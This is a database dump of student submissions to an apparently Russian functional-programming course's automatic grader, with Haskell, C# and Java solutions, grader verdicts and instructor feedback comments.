(3384, 85, '419046', '2012-11-11 16:20:17', 1, 'data Ratio = Rat Integer Integer\r\n\r\ninstance Num Ratio where\r\n\r\n    (Rat a1 b1) + (Rat a2 b2) = Rat ((a1 * b2) + (a2 * b1)) (b2 * b1)\r\n\r\ninstance Ord Ratio where\r\n\r\n    (Rat a1 b1) < (Rat a2 b2) = if (((a1'' * b2'') - (a2'' * b1'')) < 0) then True\r\n\r\n                                else False\r\n\r\n                                  where a1'' = (a1 * b1) `div` (abs b1)\r\n\r\n                                        b1'' = abs (a1 * b1) `div` (abs a1)\r\n\r\n                                        a2'' = (a2 * b2) `div` abs b2\r\n\r\n                                        b2'' = abs (a2 * b2) `div` (abs a2)\r\n\r\ninstance Show Ratio where\r\n\r\n    show (Rat a1 b1) = if ((a1 * b1) > 0) then show a1 ++ "/" ++ show b1\r\n\r\n                       else "-" ++ show (abs a1) ++ "/" ++ show (abs b1)\r\n\r\ninstance Eq Ratio where\r\n\r\n    (Rat a1 b1) == (Rat a2 b2) = a1 == a2 && b1 == b2\r\n', '<br/>Тесты успешно пройдены!'),
(3385, 89, '419046', '2012-11-11 16:56:42', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nflatten Empty = []\r\n\r\nflatten (Node n l r) = [n] ++ flatten l ++ flatten r\r\n', '<br/>Тесты успешно пройдены!'),
(3386, 90, '419046', '2012-11-11 17:26:16', 1, 'findSame [] = (0, False) \r\n  --- Просто как замечанте, получается, что у нас функция работает только с числами (из-за 0, который\r\n  --- мы тут написали. А можно сделать, чтоьы она раотал со всеми типами, которые можно сравниватить.\r\n  --- OK, мы это обсудим.\r\nfindSame (x:xs) = if ((any (== x) xs) == True)  then (x, True)\r\n   --- или короче ... = if any (==x) xs then ...\r\n                        else findSame xs\r\n', '<br/>Тесты успешно пройдены!'),
(3387, 82, '83813', '2012-11-11 17:33:27', 0, 'import Data.List\n\norder :: (Ord a) => [(a, a)] -> [(a, a)]\n\norder eqls = map (eq -> if (fst eq <= snd eq) then eq else (snd eq, fst eq)) eqls\n\n\n\nrefine :: (Ord a) => [(a, a)] -> [(a, a)]\n\nrefine eqls = sort $ order eqls\n\n\n\ntransform :: (Ord a) => [a] -> (a, a) -> [a]\n\ntransform vars eql = map (x -> if (x == fst eql) then snd eql else x) vars\n\n\n\niterateF :: (Ord a) => [(a, a)] -> [a] -> [a]\n\niterateF eqls vars = foldl transform vars eqls\n\n\n\nrev :: [(a, a)] -> [(a, a)]\n\nrev xs = reverse $ map (pair -> (snd pair, fst pair)) xs\n\n\n\ndifferentVars :: (Ord a) => [(a, a)] -> [a] -> [a]\n\ndifferentVars eqls vars = foldl\n\n                            (acc x -> iterateF (if (x `mod` 2 == 0) then reqs else rev reqs) acc)\n\n                            vars\n\n                            [1..2 * n]\n\n    where n = length vars\n\n          reqs = refine eqls\n\n\n\ncountDifferentVars :: (Ord a) => [(a, a)] -> [a] -> Int\n\ncountDifferentVars eqls vars = length $ nub $ differentVars eqls vars\n\n\n', 'Выражение имеет неправильное значение: countDifferentVars [(1,2),(1,5),(3,4),(4,5)] [1..4]'),
(3388, 83, '5772638', '2012-11-11 17:34:35', 1, 'class Program\r\n\r\n    {\r\n\r\n\r\n\r\n        public static IEnumerable <int> Lst239()\r\n\r\n\r\n\r\n        {\r\n\r\n\r\n\r\n            yield return 2;\r\n\r\n            yield return 3;\r\n\r\n            yield return 9;\r\n\r\n            foreach (int i in Lst239())\r\n\r\n            {\r\n\r\n                yield return 10 * i+2;\r\n\r\n                yield return 10 * i + 3;\r\n\r\n                yield return 10 * i + 9;\r\n\r\n            }\r\n\r\n        }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n\r\n\r\n            int tt = 1;\r\n\r\n\r\n\r\n            foreach (int pair in Lst239())\r\n\r\n            {\r\n\r\n                Console.Write(pair+" ");\r\n\r\n\r\n\r\n                tt++;\r\n\r\n\r\n\r\n                if (tt > 50)\r\n\r\n\r\n\r\n                    break;\r\n\r\n\r\n\r\n            }\r\n\r\n\r\n\r\n            Console.ReadKey();\r\n\r\n\r\n\r\n\r\n\r\n        }\r\n\r\n    }\r\n', '<br/>Тесты успешно пройдены!'),
(3389, 84, '5772638', '2012-11-11 17:50:25', 1, ' class Program\r\n\r\n    {\r\n\r\n\r\n\r\n        public static IEnumerable <double> Iterate(double n, Func<double,double> f)\r\n\r\n\r\n\r\n        {\r\n\r\n            yield return n;\r\n\r\n            \r\n\r\n            foreach (double i in Iterate(n,f))\r\n\r\n            {\r\n\r\n                yield return f(i);\r\n\r\n            }\r\n\r\n        \r\n\r\n        }\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n\r\n\r\n            int tt = 1;\r\n\r\n\r\n\r\n            foreach (double p in Iterate(1, Math.Sin))\r\n\r\n            {\r\n\r\n                Console.Write(p+" ");\r\n\r\n\r\n\r\n                tt++;\r\n\r\n\r\n\r\n                if (tt > 50)\r\n\r\n\r\n\r\n                    break;\r\n\r\n\r\n\r\n            }\r\n\r\n\r\n\r\n            Console.ReadKey();\r\n\r\n\r\n\r\n\r\n\r\n        }\r\n\r\n    }\r\n', '<br/>Тесты успешно пройдены!'),
(3390, 91, '419046', '2012-11-11 18:10:46', 1, 'merge [] ys = ys\r\n\r\nmerge xs [] = xs\r\n\r\nmerge (x:xs) (y:ys)  | x == y = x:merge xs ys\r\n\r\n                     | x < y = x:merge xs (y:ys)\r\n\r\n                     | otherwise = y:merge (x:xs) ys\r\n', '<br/>Тесты успешно пройдены!'),
(3391, 82, '83813', '2012-11-11 18:37:14', 1, 'import Data.List\r\n\r\norder :: (Ord a) => [(a, a)] -> [(a, a)]\r\n\r\norder eqls = map (eq -> if (fst eq <= snd eq) then eq else (snd eq, fst eq)) eqls\r\n\r\n\r\n\r\nrefine :: (Ord a) => [(a, a)] -> [(a, a)]\r\n\r\nrefine eqls = sort $ order eqls\r\n\r\n\r\n\r\ntransform :: (Ord a) => [a] -> (a, a) -> [a]\r\n\r\ntransform vars eql = map (x -> if (x == fst eql) then snd eql else x) vars\r\n\r\n\r\n\r\nupdateEq eql oeq = (a, b)\r\n\r\n  where a = if (fst oeq == fst eql) then\r\n\r\n              snd eql\r\n\r\n            else \r\n\r\n              fst oeq\r\n\r\n        b = if (snd oeq == fst eql) then\r\n\r\n              snd eql\r\n\r\n            else \r\n\r\n              snd oeq\r\n\r\n\r\n\r\nupdateEqs eql eqls = map (oeq -> updateEq eql oeq) eqls\r\n\r\n\r\n\r\ndifferentVars :: (Ord a) => [(a, a)] -> [a] -> [a]\r\n\r\ndifferentVars [] vars = vars\r\n\r\ndifferentVars (eql:eqls) vars = differentVars (updateEqs eql eqls) (transform vars eql)\r\n\r\n\r\n\r\ncountDifferentVars :: (Ord a) => [(a, a)] -> [a] -> Int\r\n\r\ncountDifferentVars eqls vars = length $ nub $ differentVars eqls vars\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3392, 82, '397095', '2012-11-11 18:48:42', 2, '  --- Вот такой пример например не проходит\r\n  ---   countDifferentVars [("x","y"),("y","z"),("a","b"),("x","a")] ["z","b"]\r\n  --- Если хотите, можете попробовать исправить до вторника включительно.\r\ncountDifferentVars vs xs = length (filtDiff (replace vs xs))\r\n\r\nreplace [] xs = xs\r\nreplace ((v1,v2):vs) xs = replace vs (map (	 -> if t == v1 then v2 else t) xs)\r\n\r\nfiltDiff rs = foldr (x xs -> if (contains xs x) then xs else (x:xs)) [] rs\r\n\r\ncontains [] x = False\r\ncontains (y:xs) x = if x == y then True else contains xs x', 'Выражение имеет неправильное значение: countDifferentVars  [(1,2),(3,4),(1,3)] [2,4]'),
(3393, 93, '3742311', '2012-11-11 18:54:21', 0, 'processResult [] s m = sort s\r\nprocessResult (h:t) s m = if h < m || (any (x -> h == x) s) then (processResult t s m) else (processResult t (h:s) m)\r\n\r\nham = 1:(let (a,b) = (foldr (x (s, m) -> ((x*3):(x*9):(x*10):s, if m == -1 then x else m)) ([], -1) ham) in processResult a [] b)', 'Не удалось вычислить выражение "take 10 ham", проверьте правильность синтаксиса'),
(3394, 82, '51559263', '2012-11-11 19:06:15', 2, '  --- Что-то у вас там не совсем то.. Вот еще немного упрощенный пример который не проходит\r\n  ---   countDifferentVars [("1","3"),("3","2"),("2","1")] ["1","2","3","4"]\r\n  --- У вас выдается 1. Те почему то ваша программа решает, что "4" равно чему-то другому..\r\n  --- Если хотите, можете попробовать исправить, скажем до вторника включительно\r\nallPairs [] = []\r\n\r\n\r\n\r\nallPairs (x : xs) = zip ( map (  _ -> x ) xs ) xs ++ ( allPairs xs )\r\n\r\n\r\n\r\nfullEqualSystem xs = foldr (  x y -> (snd x, fst x) : x : y ) [] xs\r\n\r\n\r\n\r\nallDifferent xs = foldr (  x y -> x : filter (/=x) y ) [] xs\r\n\r\n\r\n\r\nequalVars xs ys = foldr \r\n\r\n                       (  x y -> y + if elem x xs then 1\r\n\r\n                                      else 0 ) \r\n\r\n                       0 \r\n\r\n                       ys\r\n\r\n\r\n\r\ncountDifferentVars xs ys = let \r\n\r\n                               diffs = allDifferent ys\r\n\r\n                           in \r\n\r\n                               length diffs - equalVars \r\n\r\n                                                    ( fullEqualSystem xs ) \r\n\r\n                                                    ( allPairs diffs )\r\n\r\n\r\n\r\n', 'Выражение имеет неправильное значение: countDifferentVars [(1,3),(3,2),(2,1),(8,9)] [1,2,3,4,8,9]'),
(3395, 93, '3742311', '2012-11-11 19:20:28', 2, '  --- У вас не компилируется, потому что Хаскед не находит sort (надо написать import Data.List)\r\n  --- Но, если написать, то при вызова take 100 ham программа зацикливается\r\nprocessResult [] s _ = sort s\r\nprocessResult (h:t) s m = if h < m || (any (x -> h == x) s) then (processResult t s m) else (processResult t (h:s) m)\r\n\r\nham = 1:(let (a, b) = (foldr (x (s, m) -> ((x*3):(x*9):(x*10):s, if m == -1 then x else m)) ([], -1) ham) in (processResult a [] b))\r\n\r\n', 'Не удалось вычислить выражение "take 10 ham", проверьте правильность синтаксиса'),
(3396, 97, '550896', '2012-11-11 19:22:12', 1, '   --- OK, но, просто как замечание, счетчики тут особо не нужны, вполне мохно обойтись стеком скобок\r\ncheckBrackets :: [Char] -> Bool\r\ncheckBrackets a = checkBrackets0 0 0 [] a\r\n\r\ncheckBrackets0 :: Int -> Int -> [Int] -> [Char] -> Bool\r\ncheckBrackets0 n0 n1 ch [] = n0 == 0 && n1 == 0\r\ncheckBrackets0 n0 n1 ch a | (head a) == ''('' =\r\n  checkBrackets0 (n0 + 1) n1 (0:ch) (tail a)\r\ncheckBrackets0 n0 n1 ch a | (head a) == ''['' =\r\n  checkBrackets0 n0 (n1 + 1) (1:ch) (tail a)\r\ncheckBrackets0 n0 n1 ch a | (head a) == '')'' && n0 > 0 && (head ch) == 0 =\r\n  checkBrackets0 (n0 - 1) n1 (tail ch) (tail a)\r\ncheckBrackets0 n0 n1 ch a | (head a) == '']'' && n1 > 0 && (head ch) == 1 =\r\n  checkBrackets0 n0 (n1 - 1) (tail ch) (tail a)\r\ncheckBrackets0 n0 n1 ch a = False', '<br/>Тесты успешно пройдены!'),
(3397, 81, '214982', '2012-11-11 20:04:50', 1, 'multiplyOne [] y = []\r\nmultiplyOne (x:xs) y = (x+y):(multiplyOne xs y)\r\n\r\nmultiply [] y = y\r\nmultiply x (y:ys) =(multiplyOne x y)++(multiply x ys)   \r\n\r\nlst1 = (map (*10) lst239)\r\nlst239 = 2:3:9:(multiply [2,3,9] lst1)  ', '<br/>Тесты успешно пройдены!'),
(3398, 91, 'code', '2012-11-11 20:23:45', 0, '{- \r\nmerge :: (Ord a) => [a] -> [a] -> [a] \r\nmerge (a:as) (b:bs)  \r\n  | a < b     = a : merge as (b:bs) \r\n  | a > b     = b : merge (a:as) bs \r\n  | otherwise = a : merge as bs \r\nmerge as []   = as \r\nmerge [] bs   = bs\r\n-}', 'Не удалось вычислить выражение "merge [1,4,8] [2,4,5,10,20]", проверьте правильность синтаксиса'),
(3399, 91, 'code', '2012-11-11 20:24:47', 1, 'merge :: (Ord a) => [a] -> [a] -> [a] \r\nmerge (a:as) (b:bs)  \r\n  | a < b     = a : merge as (b:bs) \r\n  | a > b     = b : merge (a:as) bs \r\n  | otherwise = a : merge as bs \r\nmerge as []   = as \r\nmerge [] bs   = bs', '<br/>Тесты успешно пройдены!'),
(3400, 90, 'code', '2012-11-11 20:27:57', 1, 'findSame :: (Eq a) => [a] -> Maybe a \r\nfindSame []     = Nothing \r\nfindSame (x:xp) = if x `elem` xp then Just x else findSame xp', '<br/>Тесты успешно пройдены!'),
(3401, 86, 'code', '2012-11-11 20:36:09', 1, 'allNondivisible :: [Integer] -> Bool\r\nallNondivisible ls = go ls (const False)\r\n  where\r\n    go []     _ = True\r\n    go (x:xp) f = not (f x) && go xp f''\r\n      where f'' n = f n || n `mod` x == 0 || x `mod` n == 0', '<br/>Тесты успешно пройдены!'),
(3402, 93, 'code', '2012-11-11 20:52:57', 1, 'merge :: (Ord a) => [a] -> [a] -> [a]\r\nmerge (a:as) (b:bs)  \r\n  | a < b     = a : merge as (b:bs) \r\n  | a > b     = b : merge (a:as) bs \r\n  | otherwise = a : merge as bs\r\nham :: [Integer]\r\nham = 1 : merge (map (*3) ham) (map (*10) ham)', '<br/>Тесты успешно пройдены!'),
(3403, 82, '51559263', '2012-11-12 01:54:22', 0, 'allPairs [] = []\r\n\n\r\n\nallPairs (x : xs) = zip ( map (  _ -> x ) xs ) xs ++ ( allPairs xs )\r\n\n\r\n\nfullEqualSystem xs = foldr \r\n\n                          (  (x,y) ys -> let \r\n\n                                             lst = foldr (  (a,b) ps -> a : b : ps ) [] ys\r\n\n                                          in  \r\n\n                                             if ( (elem x lst) && (elem y lst) ) \r\n\n                                             then ys\r\n\n                                             else (y,x) : (x,y) : ys ) \r\n\n                          [] \r\n\n                          xs\r\n\n\r\n\nallDifferent xs = foldr (  x ys -> x : filter (/=x) ys ) [] xs\r\n\n\r\n\nequalVars xs ys = foldr \r\n\n                       (  x y -> y + if elem x xs then 1 else 0 ) \r\n\n                       0 \r\n\n                       ys\r\n\n\r\n\ncountDifferentVars xs ys = let \r\n\n                               diffs = allDifferent ys\r\n\n                           in \r\n\n                               length diffs - equalVars \r\n\n                                                    ( fullEqualSystem xs ) \r\n\n                                                    ( allPairs diffs )\r\n\n\r\n\n\n', 'Выражение имеет неправильное значение: countDifferentVars  [(1,2),(3,4),(1,3)] [2,4]'),
(3404, 91, '1029771', '2012-11-12 06:31:34', 1, 'merge [] b = b\r\nmerge a [] = a\r\nmerge a b = if head(a) < head(b) then (head(a)):(merge (tail(a)) b)\r\n	    else if head(a) > head(b) then (head(b)):(merge a (tail(b)))\r\n		 else (head(b)):(merge (tail(a)) (tail(b)))', '<br/>Тесты успешно пройдены!'),
(3405, 86, '1029771', '2012-11-12 07:53:18', 0, '\r\nallNondivisible a =  not ((foldr (||) False [(((rem (head(a)) x)==0)||((rem x (head(a)))==0)) |x <- tail(a)])||(allNondivisible (tail(a))))\r\n', 'Не удалось вычислить выражение "allNondivisible [4, 7, 6, 5]", проверьте правильность синтаксиса'),
(3406, 86, '1029771', '2012-11-12 08:05:28', 2, 'allNondivisible [] = True\r\nallNondivisible a = (not(foldr (||) False [(((rem (head(a)) x)==0)||((rem x (head(a)))==0)) |x <- tail(a)]))&&(allNondivisible (tail(a)))\r\n  --- OK, это не совсем то, что имелось в виду и давайте я подскажу, что имелось в виду.\r\n  --- 1. Пусть из каких то соображений, мы хотим чтобы эта функция использовала хвостовую рекурсию.\r\n  --- Это можно сделать как-то так:\r\n  ---  - определить функицю allNondivisible1 с доп параметром в котором мы запоминаем все, что мы уже просмотрели\r\n  ---    allNondivisible1 [] _ = True\r\n  ---    allNondivisible1 (x:xs) ys = if x делиться на элемент из ys или наоборот \r\n  ---                                then False \r\n  ---                                else allNondivisible1 xs (x:ys)\r\n  ---    И вызов\r\n  ---    allNondivisible xs = allNondivisible1 xs []\r\n  --- Таким образом, в доп параметре мы копим список - например для allNondivisible [3,5,2,6] копим\r\n  --- там сначала [], потом [3], потом [5,3] и т.д.\r\n  --- А теперь собственно идея: предлагается попробовать написать похоже, но копить не список, а _условие_\r\n  --- Чтобы сначала было условие t -> True, потом t -> mod t 3 !=0 && mod 3 t != 0, потом\r\n  --- t -> mod t 3 !=0 && mod 3 t != 0 && mod t 5 !=0 && mod 5 t != 0\r\n  --- И т.д. \r\n  --- Вот, такая подсказка. Проще всего, честно говоря посмотреть похожий пример в конспекте)\r\n', '<br/>Тесты успешно пройдены!'),
(3407, 83, 'jogrms', '2012-11-12 08:18:48', 1, 'using System;\r\nusing System.Linq;\r\nusing System.Collections.Generic;\r\n\r\nnamespace ConsoleApplication1\r\n{\r\n    class Program\r\n    {\r\n        public static IEnumerable<int> Lst239()\r\n        {\r\n            yield return 2;\r\n            yield return 3;\r\n            yield return 9;\r\n            foreach (int x in Lst239())\r\n            {\r\n                yield return x * 10 + 2;\r\n                yield return x * 10 + 3;\r\n                yield return x * 10 + 9;\r\n            }\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            foreach (int i in Lst239()) {\r\n                if (i > 1000) break;\r\n                System.Console.WriteLine(i);\r\n            }\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(3408, 84, 'jogrms', '2012-11-12 08:28:55', 1, 'using System;\r\nusing System.Linq;\r\nusing System.Collections.Generic;\r\n\r\nnamespace ConsoleApplication1\r\n{\r\n    class Program\r\n    {\r\n        public static IEnumerable<double> Iterate(double x, Func<double,double> f)\r\n        {\r\n            yield return x;\r\n            foreach (double i in Iterate(x, f))\r\n            {\r\n                yield return f(i);\r\n            }\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            foreach (double x in Iterate(2, x => x * 2))\r\n            {\r\n                Console.WriteLine(x);\r\n                if (x > 100)\r\n                    break;\r\n            }\r\n            Console.WriteLine();\r\n            int i = 0;\r\n            foreach (double x in Iterate(1, Math.Sin))\r\n            {\r\n                Console.WriteLine(x);\r\n                if (i++ == 10)\r\n                    break;\r\n            }\r\n        }\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(3409, 97, '787463', '2012-11-12 12:40:19', 1, 'check b1 b2 = (b1 ++ b2 == "()") || (b1 ++ b2 == "[]") || (b2 ++ b1 == "()") || (b2 ++ b1 == "[]")\r\n  --- У, вас на самом деле, check вызывается только если b1 - закрывающая скобка, поэтому часть проверок\r\n  --- видимо лишняя\r\ncheckBrackets'' [] [] = True\r\ncheckBrackets'' [] _ = False\r\ncheckBrackets'' s [] =\r\n    let\r\n      b = [head s]\r\n    in\r\n        if b == ")" || b == "]"\r\n        then False\r\n        else checkBrackets'' (tail s) [b]\r\ncheckBrackets'' s begs =\r\n    let\r\n      b1 = [head s]\r\n      b2 = head begs\r\n    in\r\n        if b1 == "(" || b1 == "["\r\n        then checkBrackets'' (tail s) (b1:begs)\r\n        else if check b1 b2\r\n             then checkBrackets'' (tail s) (tail begs)\r\n             else False\r\n\r\ncheckBrackets s = checkBrackets'' s []', '<br/>Тесты успешно пройдены!'),
(3410, 98, '787463', '2012-11-12 12:40:56', 1, 'data Tree a = Empty | Node a (Tree a) (Tree a) deriving Show\r\n\r\ntoStr Empty = "e"\r\ntoStr (Node c l r) = [c] ++ toStr l ++ toStr r\r\n\r\nfromStr'' (x:s) =\r\n    if x == ''e'' then (Empty, s)\r\n    else\r\n        let\r\n          (l, rest1) = fromStr'' s\r\n          (r, rest2) = fromStr'' rest1\r\n        in (Node x l r, rest2)\r\n\r\nfromStr s = fst (fromStr'' s)', '<br/>Тесты успешно пройдены!'),
(3411, 97, '2118411', '2012-11-12 13:06:19', 0, '  GNU nano 2.2.4                                     Файл: 25.hs                                                                      Изменен  \r\n\r\ncheckBrackets xs = checkIt xs []\r\n\r\ncheckIt [] [] = True\r\ncheckIt [] _  = False\r\ncheckIt (''('':xs) ys = checkIt xs ('')'':ys)\r\ncheckIt (''['':xs) ys = checkIt xs ('']'':ys)\r\ncheckIt _  [] = False\r\ncheckIt (x:xs) (y:ys) = (x == y) && (checkIt xs ys)\r\n', 'Не удалось вычислить выражение "checkBrackets [''('',''['','']'','')'']", проверьте правильность синтаксиса'),
(3412, 97, '2118411', '2012-11-12 13:07:56', 1, 'checkBrackets xs = checkIt xs []\r\n\r\ncheckIt [] [] = True\r\ncheckIt [] _  = False\r\ncheckIt (''('':xs) ys = checkIt xs ('')'':ys)\r\ncheckIt (''['':xs) ys = checkIt xs ('']'':ys)\r\ncheckIt _  [] = False\r\ncheckIt (x:xs) (y:ys) = (x == y) && (checkIt xs ys)\r\n', '<br/>Тесты успешно пройдены!'),
(3413, 86, 'erwert', '2012-11-12 15:03:07', 0, '-- полагаю.. как-то так. (=\r\nallNondivisible l = acc l (a -> True)\r\n\r\nacc [] cond = True\r\nacc (h:hs) cond\r\n	| not $ cond h = False\r\n	| True = acc hs (a -> cond a && mod a h /= 0 && mod a h /= 0)\r\n', 'Выражение имеет неправильное значение: allNondivisible [4,2]'),
(3414, 86, 'erwert', '2012-11-12 15:05:18', 0, 'acc [] cond = True\r\nacc (h:hs) cond\r\n	| not $ cond h = False\r\n	| True = acc hs (a -> cond a && mod a h /= 0 && mod h a /= 0)', 'Не удалось вычислить выражение "allNondivisible [2, 7, 6, 5]", проверьте правильность синтаксиса'),
(3415, 86, 'erwert', '2012-11-12 15:05:57', 1, 'allNondivisible l = acc l (a -> True)\r\n\r\nacc [] cond = True\r\nacc (h:hs) cond\r\n	| not $ cond h = False\r\n	| True = acc hs (a -> cond a && mod a h /= 0 && mod h a /= 0)', '<br/>Тесты успешно пройдены!'),
(3416, 97, '472848', '2012-11-12 18:26:57', 1, 'checkBrackets s = f [] s\r\n\r\nf li [] = 0 == length li\r\nf [] (x:xs) = f [x] xs\r\nf (y:ys) (x:xs) | x == '']'' && y == ''['' = f ys xs\r\n		| x == '')'' && y == ''('' = f ys xs\r\n                | otherwise            = f (x:y:ys) xs', '<br/>Тесты успешно пройдены!'),
(3417, 83, 'hasp', '2012-11-12 18:36:22', 1, '/*Stub, задачка отправлена на почту */\r\nstatic class Context {\r\n        private ArrayList<Integer> calculated = new ArrayList<Integer>(Arrays.asList(2,3,9));\r\n\r\n        private class MLI implements Iterator<Integer>, Iterable<Integer> {\r\n            int index = -1;\r\n            MLI ri = null;\r\n            MLI ri2 = null;\r\n            MLI ri3 = null;\r\n\r\n            public boolean hasNext() { return true; }\r\n            public void remove() {}\r\n\r\n            private int powTen(int i) {\r\n                return ((int) Math.pow(10.0, (i + "").length() + 0.0));\r\n            }\r\n\r\n            private int getNext(int d, int i) {\r\n                return new Double(d* (double) powTen(i)).intValue() + i;\r\n            }\r\n\r\n            private void useIt(int prefix, MLI it) {\r\n                for (Integer i : it) {\r\n                    calculated.add(getNext(prefix, i));\r\n                    if ((i + 1)%powTen(i) == 0) break;\r\n                }\r\n            }', '<br/>Тесты успешно пройдены!'),
(3418, 84, 'hasp', '2012-11-12 18:36:57', 1, '/*Stub, задача отправлена на почту*/\r\nstatic class RepeatIteratorBuilder<T> {\r\n        public RepeatIterator createIterator(T state, Mapper mapper) {\r\n            return new RepeatIterator(state, mapper);\r\n        }\r\n\r\n        class RepeatIterator implements Iterator<T>, Iterable<T> {\r\n            private T state;\r\n            private Mapper mapper;\r\n\r\n            private RepeatIterator(T state, Mapper mapper) {\r\n                this.state = state;\r\n                this.mapper = mapper;\r\n            }\r\n\r\n            public Iterator<T> iterator() { return this; }\r\n            public boolean hasNext() { return true; }\r\n            public void remove() { throw  new UnsupportedOperationException(); }\r\n\r\n            public T next() {\r\n                T olsState = state;\r\n                state = mapper.apply(state);\r\n                return olsState;\r\n            }\r\n        }\r\n\r\n        abstract class Mapper {\r\n            abstract T apply(T e);\r\n        }\r\n    }', '<br/>Тесты успешно пройдены!'),
(3419, 87, 'erwert', '2012-11-12 18:45:29', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving(Show)\r\n\r\neval X n = n\r\neval (N a) n = a\r\neval (Mult a b) n = eval a n * eval b n\r\neval (Add a b) n = eval a n + eval b n', '<br/>Тесты успешно пройдены!'),
(3420, 83, '374969', '2012-11-12 19:03:39', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace ConsoleApplication\r\n{\r\n	class Program\r\n	{\r\n		static void Main(string[] args)\r\n		{\r\n			foreach (var s in Lst239().Take(20))\r\n			{\r\n				Console.WriteLine(s);\r\n			}\r\n		}\r\n\r\n		static IEnumerable<int> Lst239()\r\n		{\r\n			yield return 2;\r\n			yield return 3;\r\n			yield return 3;\r\n			foreach (var curr in Lst239())\r\n			{\r\n				yield return curr*10+2;\r\n				yield return curr*10+3;\r\n				yield return curr*10+9;\r\n			}\r\n		}\r\n	}\r\n}', '<br/>Тесты успешно пройдены!'),
(3421, 84, '374969', '2012-11-12 19:09:57', 1, 'using System;\r\nusing System.Collections.Generic;\r\nusing System.Linq;\r\nusing System.Text;\r\n\r\nnamespace ConsoleApplication\r\n{\r\n	class Program\r\n	{\r\n		static void Main(string[] args)\r\n		{\r\n			foreach (var s in Iterate(2, x => 2*x).Take(20))\r\n			{\r\n				Console.WriteLine(s);\r\n			}\r\n		}\r\n\r\n		static IEnumerable<double> Iterate(double start, Func<double, double> iter)\r\n		{\r\n			yield return start;\r\n			foreach (var curr in Iterate(iter(start), iter))\r\n			{\r\n				yield return curr;\r\n			}\r\n		}\r\n	}\r\n}', '<br/>Тесты успешно пройдены!'),
(3422, 84, '397095', '2012-11-12 19:10:57', 1, 'using System;\r\nusing System.Collections.Generic;\r\n\r\nnamespace FunctionalProgramming\r\n{\r\n	class Iteration\r\n	{\r\n		const int COUNT = 100;\r\n\r\n		static IEnumerable<double> Iterate(double start, Func<double,double> function) \r\n		{\r\n			double current = start;\r\n			while(true)\r\n			{\r\n				double temp = current;\r\n				current = function.Invoke(current);\r\n				yield return temp;\r\n			}\r\n		}\r\n\r\n		static void Main(string[] args) \r\n		{\r\n			foreach (double x in Iterate(2, x => x*2))\r\n			{\r\n				Console.WriteLine(x);\r\n				if (x > 1000000) break;\r\n			}\r\n\r\n			int i = 0;\r\n			foreach (double x in Iterate(1, Math.Sin))\r\n			{\r\n				Console.WriteLine(x);\r\n				if (i++ == 100) break;\r\n			}\r\n		}\r\n	}\r\n}\r\n', '<br/>Тесты успешно пройдены!'),
(3423, 84, '4169333', '2012-11-12 19:13:40', 1, 'namespace _2_12_11\r\n{\r\n    class Program\r\n    {\r\n        public static IEnumerable <double> Iterate (double i, Func<double, double> f)\r\n        {\r\n            double res=i;\r\n            for (int j = 1; ; j++)\r\n            {\r\n                yield return(res);\r\n                res = f(res);\r\n            }\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            /*int i = 0;\r\n            foreach (double x in Iterate (1, Math.Sin))\r\n            {\r\n                Console.WriteLine(x);\r\n                if (i++ == 100)\r\n                    break;\r\n            }*/\r\n            foreach (double x in Iterate(2, x => x * 2))\r\n            {\r\n                Console.WriteLine(x);\r\n                if (x > 1000000)\r\n                    break;\r\n            }\r\n            Console.ReadLine();\r\n        }\r\n\r\n    }\r\n}', '<br/>Тесты успешно пройдены!'),
(3424, 83, '4169333', '2012-11-12 19:20:16', 1, '   --- ОК, хорошо. Я бы только предолжил приписывать считать Math.Pow(10, n) для каждого n один раз.\r\n   --- А еще проще припиыввать цифры не слева, а справа. для этого Pow не нужен.\r\n   --- Есть и более простое решение, мб мы его разберем или я его выложу.\r\nnamespace _1_12_11\r\n{\r\n    class Program\r\n    {\r\n        public static IEnumerable <int> Lst239()\r\n        {\r\n            List<int> res = new List<int>();\r\n            res.Add(2);\r\n            res.Add(3);\r\n            res.Add(9);\r\n            yield return (2);\r\n            yield return (3);\r\n            yield return (9);\r\n            List<int> lst = new List<int>();\r\n            for (int n = 1; ; n++)\r\n            {\r\n                // "Отрезаем" от результирующего списка последние 3^n элементов\r\n                lst = res.GetRange(res.Count - (int)Math.Pow(3, n), (int)Math.Pow(3, n));\r\n                foreach (int j in lst)\r\n                {\r\n                    res.Add(2 * (int)Math.Pow(10, n) + j);\r\n                    yield return (2 * (int)Math.Pow(10, n) + j);\r\n                }\r\n                foreach (int j in lst)\r\n                {\r\n                    res.Add(3 * (int)Math.Pow(10, n) + j);\r\n                    yield return (3 * (int)Math.Pow(10, n) + j);\r\n                }\r\n                foreach (int j in lst)\r\n                {\r\n                    res.Add(9 * (int)Math.Pow(10, n) + j);\r\n                    yield return (9 * (int)Math.Pow(10, n) + j);\r\n                }\r\n            }\r\n\r\n        }\r\n\r\n        static void Main(string[] args)\r\n        {\r\n            foreach (int x in Lst239().Take(39))\r\n            {\r\n                Console.Write(x + ",");\r\n            }\r\n\r\n            Console.ReadLine();\r\n\r\n        }\r\n    }\r\n\r\n}', '<br/>Тесты успешно пройдены!'),
